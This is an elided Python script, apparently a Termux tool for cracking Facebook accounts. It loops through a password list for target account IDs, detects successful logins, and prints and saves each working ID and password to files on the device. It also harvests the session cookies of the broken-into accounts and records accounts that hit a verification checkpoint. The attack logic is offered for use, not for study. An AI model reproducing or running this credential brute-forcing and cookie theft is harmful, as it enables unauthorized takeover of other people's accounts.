...
try:
    ...
    os.system("clear")
    print(f"{style} {green}ROFIQUL TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"{green} RUN AGAIN 👉 python TAREK-GREEN.py")
...
def tarek_main():
    ...
    if menu_select in ['A','a','01','1']:os.system("xdg-open https://www.facebook.com/profile.php?id=100080591932535");_random_password()
    elif menu_select in ['B','b','02','2']:os.system("xdg-open https://www.facebook.com/profile.php?id=100080591932535");__FILEX__()
    elif menu_select in ['C','c','03','3']:os.system("xdg-open https://www.facebook.com/profile.php?id=100080591932535")
    elif menu_select in ['O','o','00','0']:os.system("xdg-open https://www.facebook.com/profile.php?id=100080591932535");os.system("exit")
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'session_key' in q:
                ...
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f"\r\r{red}[{green1}ROFIQUL{red}•{green1}OK{red}•💚{red}] {green1}{ids} {red}»{green1} {pas}")
                print(f"\r\r{red}[{green1}🍪{red}]{white} {coki}")
                oks.append(ids)
                open('/sdcard/ROFIQUL -TOOL/ROFIQUL-FILE-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ROFIQUL-TOOL/ROFIQUL-FILE-M5-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[DIED]{rad} {ids} {rad}| {pas}')
                open('/sdcard/ROFIQUL-TOOL/ROFIQUL-FILE-M5-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
